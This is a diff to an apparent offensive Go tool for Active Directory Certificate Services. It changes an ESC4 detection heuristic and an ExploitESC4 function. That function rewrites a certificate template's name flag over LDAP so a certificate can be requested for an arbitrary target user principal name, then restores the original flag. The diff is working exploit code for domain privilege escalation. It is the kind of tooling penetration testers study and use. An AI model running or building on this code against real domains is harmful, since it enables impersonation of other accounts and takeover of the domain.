@@ -215,10 +215,10 @@ func scoreESC(tmpl *CertTemplate) {
 	}
 
 	// ESC4: WriteDacl/WriteOwner on template (checked via security descriptor)
-	// This requires parsing the SD which is complex; we flag if SD is present
+	// NOTE: Flags templates with non-empty security descriptors for manual SDDL/ACE review.
+	// Does NOT parse SDDL ACEs — any template with a security descriptor is flagged.
+	// Manual verification required to confirm actual WriteDacl/WriteOwner permissions.
 	if len(tmpl.SecurityDescriptor) > 0 {
-		// A proper implementation would parse the SDDL and check ACEs
-		// For now we mark it as needing manual review
 		tmpl.ESCVulns = append(tmpl.ESCVulns, "ESC4-CHECK")
 		tmpl.ESCScore += 1
 	}
@@ -334,11 +334,16 @@ func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	templateDN := result.Entries[0].DN
 	fmt.Printf("[+] Found template DN: %s\n", templateDN)
 
+	// Save original flag value before modification
+	originalFlag := result.Entries[0].GetAttributeValue("msPKI-Certificate-Name-Flag")
+	if originalFlag == "" {
+		originalFlag = "0"
+	}
+
 	// Step 2: Modify template to enable enrollee supplies subject
 	fmt.Println("[*] Modifying template to enable ENROLLEE_SUPPLIES_SUBJECT...")
 	modReq := ldap.NewModifyRequest(templateDN, nil)
 	modReq.Replace("msPKI-Certificate-Name-Flag", []string{"1"}) // CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
-
 	if err := conn.Modify(modReq); err != nil {
 		return nil, fmt.Errorf("modify template (need WriteDacl): %w", err)
 	}
@@ -349,7 +354,7 @@ func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	if err != nil {
 		// Try to restore template
 		restoreReq := ldap.NewModifyRequest(templateDN, nil)
-		restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{"0"})
+		restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{originalFlag})
 		conn.Modify(restoreReq)
 		return nil, fmt.Errorf("ESC1 exploitation after ESC4 modification: %w", err)
 	}
@@ -357,7 +362,7 @@ func ExploitESC4(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	// Step 4: Restore original template configuration
 	fmt.Println("[*] Restoring original template configuration...")
 	restoreReq := ldap.NewModifyRequest(templateDN, nil)
-	restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{"0"})
+	restoreReq.Replace("msPKI-Certificate-Name-Flag", []string{originalFlag})
 	if err := conn.Modify(restoreReq); err != nil {
 		fmt.Printf("[!] Warning: failed to restore template: %v\n", err)
 	} else {
